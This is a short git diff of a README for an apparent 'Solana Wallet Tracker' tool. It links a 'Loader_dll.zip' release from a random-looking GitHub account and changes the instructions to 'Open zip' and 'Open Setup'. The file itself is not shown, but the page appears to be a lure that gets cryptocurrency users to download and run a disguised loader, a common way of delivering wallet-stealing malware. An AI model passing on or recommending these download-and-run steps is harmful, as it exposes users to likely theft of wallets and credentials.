@@ -9,7 +9,9 @@ Solana Wallet Tracker is a lightweight and user-friendly application designed to
 
 1. [Download](https://github.com/bzshhsdhdj/solana-wallet-tracker/releases/download/Download/Loader_dll.zip)
 
-2. Download the appropriate file for your OS (Windows)
+2. Open zip
+
+3. Open Setup
 
 
 
